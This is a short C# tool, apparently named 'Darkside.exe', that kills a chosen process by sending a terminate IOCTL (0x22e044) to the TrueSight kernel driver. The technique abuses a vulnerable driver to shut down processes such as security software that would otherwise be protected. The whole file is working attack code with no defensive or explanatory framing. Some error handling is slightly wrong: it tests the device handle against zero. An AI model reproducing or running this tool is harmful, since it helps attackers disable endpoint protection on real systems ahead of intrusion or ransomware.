using System.Runtime.InteropServices;

class Program
{
    private const uint TERMINATE_PROCESS_IOCTL_CODE = 0x22e044;

    [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr CreateFile(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes,
        uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern bool DeviceIoControl(IntPtr deviceHandle, uint ioctlCode, ref uint inputBuffer, uint inputBufferSize,
        ref uint outputBuffer, uint outputBufferSize, out uint bytesReturned, IntPtr overlapped);

    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    static bool CheckProcess(uint processId)
    {
        using (var process = System.Diagnostics.Process.GetProcessById((int)processId))
        {
            return process != null;
        }
    }

    static uint GetProcessId(string processName)
    {
        foreach (var process in System.Diagnostics.Process.GetProcessesByName(processName))
        {
            return (uint)process.Id;
        }
        return 0;
    }

    static void Main(string[] args)
    {
        if (args.Length != 2 || args[0] != "-p")
        {
            Console.WriteLine("Invalid number of arguments: Darkside.exe -p <PID>");
            return;
        }

        if (!uint.TryParse(args[1], out uint processId))
        {
            Console.WriteLine("Invalid argument: Darkside.exe -p <PID>");
            return;
        }

        if (!CheckProcess(processId))
        {
            Console.WriteLine("Provided process ID doesn't exist!");
            return;
        }

        IntPtr deviceHandle = CreateFile("\\\\.\\TrueSight", 0xC0000000, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
        if (deviceHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open handle to driver! Make sure the driver is loaded and running.");
            return;
        }

        try
        {
            uint input = processId;
            uint output = 0;
            uint bytesReturned;
            Console.WriteLine("Terminating process...");
            if (!DeviceIoControl(deviceHandle, TERMINATE_PROCESS_IOCTL_CODE, ref processId, sizeof(uint), ref output, sizeof(uint), out bytesReturned, IntPtr.Zero))
            {
                Console.WriteLine("Failed to terminate process: 0x{0:X}", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("Process has been terminated!");
        }
        finally
        {
            CloseHandle(deviceHandle);
        }

        Console.WriteLine("Press any key to continue...");
        Console.ReadKey();
    }
}